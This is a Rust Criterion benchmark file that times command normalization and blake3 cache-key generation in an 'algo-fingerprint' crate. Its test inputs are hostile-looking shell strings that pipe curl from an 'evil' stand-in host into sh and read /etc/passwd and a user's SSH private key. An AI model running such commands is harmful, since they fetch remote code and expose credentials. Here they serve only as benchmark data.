//! Criterion bench for `algo-fingerprint` normalize + cache_key
//! `cargo bench -p algo-fingerprint --bench normalize -- --save-baseline p1-exit`
//! Group name: `fingerprint_normalize` per spec.
//! Benches: normalize(short curl-pipe), normalize(long command 10k), cache_key (blake3).
//! Budgets: inherits L0/L1 p50<3ms p99<10ms; fingerprint is on hot path, zero-alloc SmallVec/Arc path in pipeline.
//! See core/benches/README.md for baseline workflow.

use algo_fingerprint::{cache_key, normalize};
use criterion::{black_box, criterion_group, criterion_main, BenchmarkId, Criterion, Throughput};

fn long_command_10k() -> String {
    // 10 KiB payload: curl prefix + 10k filler + pipe + sh -c inner
    let filler: String = "a".repeat(10 * 1024);
    format!("curl -s http://evil.example.com/{filler} | sh -c 'echo hello world; ls -la /tmp/foo; cat /etc/passwd'")
}

fn short_sh_c() -> &'static str {
    "curl -s http://evil | sh -c 'echo hello; ls -la /var/tmp/test; cat /home/user/.ssh/id_rsa'"
}

fn bench_fingerprint_normalize(c: &mut Criterion) {
    let mut group = c.benchmark_group("fingerprint_normalize");
    group.throughput(Throughput::Bytes(10 * 1024));

    let short = short_sh_c();
    let long = long_command_10k();
    let long_static: &'static str = Box::leak(long.clone().into_boxed_str());

    // 1) normalize short sh -c
    group.bench_with_input(
        BenchmarkId::new("normalize", "short_sh_c"),
        &short,
        |b, input| {
            b.iter(|| {
                let out = normalize(black_box(input));
                black_box(out);
            });
        },
    );

    // 2) normalize long 10k
    group.bench_with_input(
        BenchmarkId::new("normalize", "long_10k"),
        &long_static,
        |b, input| {
            b.iter(|| {
                let out = normalize(black_box(input));
                black_box(out);
            });
        },
    );

    // 3) normalize + cache_key combined (pipeline hot path)
    group.bench_function("normalize_plus_cache_key_short", |b| {
        b.iter(|| {
            let norm = normalize(black_box(short));
            let key = cache_key(black_box(&norm), "v0", "balanced");
            black_box(key);
        });
    });
    group.bench_function("normalize_plus_cache_key_long_10k", |b| {
        b.iter(|| {
            let norm = normalize(black_box(long_static));
            let key = cache_key(black_box(&norm), "v0", "balanced");
            black_box(key);
        });
    });

    // 4) cache_key alone (blake3)
    group.bench_function("cache_key_only", |b| {
        let norm = normalize(short);
        b.iter(|| {
            let key = cache_key(black_box(&norm), black_box("v0"), black_box("balanced"));
            black_box(key);
        });
    });

    // 5) Throughput: 100 normalizes (simulates 100 rps)
    group.bench_function("throughput_100_short", |b| {
        b.iter(|| {
            for _ in 0..100 {
                black_box(normalize(black_box(short)));
            }
        });
    });

    group.finish();

    // Hints: warn if long normalize exceeds budget
    let start = std::time::Instant::now();
    for _ in 0..500 {
        black_box(normalize(black_box(long_static)));
    }
    let avg_ns = start.elapsed().as_nanos() as f64 / 500.0;
    eprintln!(
        "[fingerprint_normalize] sampled avg normalize(long_10k) ~{:.0} ns ({:.3} ms)",
        avg_ns,
        avg_ns / 1_000_000.0
    );
    eprintln!("[fingerprint_normalize] baseline: cargo bench -p algo-fingerprint --bench normalize -- --save-baseline p1-exit");
}

criterion_group!(benches, bench_fingerprint_normalize);
criterion_main!(benches);
